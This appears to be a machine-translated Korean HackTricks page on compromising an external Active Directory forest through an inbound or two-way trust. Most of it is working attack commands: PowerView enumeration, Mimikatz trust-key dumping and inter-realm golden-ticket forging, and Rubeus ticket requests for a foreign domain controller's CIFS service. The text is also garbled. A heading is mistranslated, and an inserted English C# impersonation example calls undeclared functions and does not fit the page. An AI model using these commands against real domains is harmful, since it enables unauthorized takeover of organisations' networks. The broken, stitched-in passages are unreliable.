# 외부 포레스트 도메인 - 단방향 (수신) 또는 양방향

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 **HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>

이 시나리오에서 외부 도메인이 신뢰하고 있으므로 (또는 둘 다 서로 신뢰하고 있는 경우) 일부 액세스를 얻을 수 있습니다.

## 열거

먼저, **신뢰**를 **열거**해야 합니다:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
이전의 열거에서는 **`crossuser`** 사용자가 **`External Admins`** 그룹에 속해 있으며 **외부 도메인의 DC**에서 **관리자 액세스**를 가지고 있음을 발견했습니다.

## 초기 접근

다른 도메인에서 사용자의 특별한 액세스를 찾지 못했다면, 여전히 AD 방법론으로 돌아가서 **권한이 없는 사용자로부터 권한 상승**을 시도할 수 있습니다 (예: kerberoasting과 같은 것):

`-Domain` 매개변수를 사용하여 **Powerview 함수**를 사용하여 **다른 도메인**을 열거할 수 있습니다.
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
## 표절

### 로그인

외부 도메인에 액세스 권한이 있는 사용자의 자격 증명을 사용하여 일반적인 방법으로 로그인하면 다음에 액세스할 수 있어야 합니다:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History 남용

[**SID History**](sid-history-injection.md)를 포레스트 신뢰 관계에서도 남용할 수 있습니다.

만약 사용자가 **한 포레스트에서 다른 포레스트로 이동**되고 **SID 필터링이 비활성화**되어 있다면, 다른 포레스트의 **SID**를 **추가**할 수 있으며, 이 **SID**는 **신뢰 관계를 통해 인증**할 때 사용자의 토큰에 **추가**됩니다.

{% hint style="warning" %}
알림: 서명 키를 다음과 같이 얻을 수 있습니다.
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

현재 도메인의 사용자를 표현하는 **TGT를 위조**하여 **신뢰할 수 있는** 키로 **서명**할 수 있습니다.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### 사용자를 완전히 표현하는 방법

In this technique, we will impersonate the user in order to gain access to their resources and perform actions on their behalf. This can be useful in scenarios where we have obtained the user's credentials or have gained access to their session.

To impersonate the user, we can make use of the `ImpersonateLoggedOnUser` function in Windows. This function allows us to switch the current thread's security context to that of the specified user.

Here is an example of how to use the `ImpersonateLoggedOnUser` function in C#:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    static void Main(string[] args)
    {
        IntPtr tokenHandle = IntPtr.Zero;
        bool success = LogonUser("username", "domain", "password", 2, 0, ref tokenHandle);

        if (success)
        {
            success = ImpersonateLoggedOnUser(tokenHandle);

            if (success)
            {
                // Perform actions as the impersonated user

                success = RevertToSelf();
            }

            CloseHandle(tokenHandle);
        }
    }
}
```

In this example, we first obtain the user's token by calling the `LogonUser` function. We then use the obtained token to impersonate the user by calling the `ImpersonateLoggedOnUser` function. After performing the desired actions as the impersonated user, we revert back to the original security context by calling the `RevertToSelf` function.

By impersonating the user, we can access their resources and perform actions on their behalf, allowing us to bypass certain security measures and gain unauthorized access to sensitive information or systems.
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 전문가 수준까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기교를 공유해주세요.

</details>
